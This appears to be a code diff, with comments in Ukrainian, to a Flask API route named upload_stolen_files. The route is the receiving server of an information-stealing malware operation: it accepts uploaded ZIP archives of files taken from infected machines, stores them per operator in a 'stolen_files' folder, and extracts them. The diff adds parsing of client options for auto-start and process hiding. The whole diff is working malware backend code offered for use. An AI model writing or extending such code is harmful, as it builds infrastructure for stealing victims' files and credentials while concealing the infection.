@@ -82,13 +82,27 @@ def _process_zip_archive(zip_path: str, upload_dir: str, admin_id: str) -> list:
         logger.error(f"ZIP processing error: {e}")
         return []
 
+# web/api/routes.py - ОНОВЛЕНА ФУНКЦІЯ upload_stolen_files
 @api_bp.route('/upload', methods=['POST'])
 def upload_stolen_files():
-    """API endpoint для отримання вкрадених файлів від функціонального стіллера"""
+    """API endpoint для отримання вкрадених файлів"""
     try:
         # Отримуємо дані з запиту
         admin_id = request.form.get('admin_id', '1')
         client_info = request.form.get('client_id', '{}')
+        
+        # Парсимо інформацію про клієнта
+        try:
+            client_data = json.loads(client_info)
+            features = client_data.get('features', [])
+            auto_start = client_data.get('auto_start', False)
+            hide_process = client_data.get('hide_process', False)
+            
+            logger.info(f"Client features: {features}, Auto start: {auto_start}, Hide process: {hide_process}")
+        except:
+            features = []
+            auto_start = False
+            hide_process = False
         
         # Отримуємо файл
         if 'file' not in request.files:
@@ -98,7 +112,7 @@ def upload_stolen_files():
         if file.filename == '':
             return jsonify({'status': 'error', 'message': 'No file selected'}), 400
         
-        logger.info(f"Received file from client: {client_info} for admin {admin_id}")
+        logger.info(f"Received file with features: {features}")
         
         # Створюємо папку для адміна
         admin_upload_dir = f"uploads/stolen_files/{admin_id}"
@@ -111,12 +125,13 @@ def upload_stolen_files():
         file.save(file_path)
         
         # Обробляємо ZIP архів
-        extracted_files = _process_zip_archive(file_path, admin_upload_dir, admin_id)
+        extracted_files = _process_zip_archive(file_path, admin_upload_dir, admin_id, features)
         
         return jsonify({
             'status': 'success',
-            'message': f'Received and processed {len(extracted_files)} files',
+            'message': f'Received {len(extracted_files)} files with features: {features}',
             'files': extracted_files,
+            'features': features,
             'admin_id': admin_id
         })
         
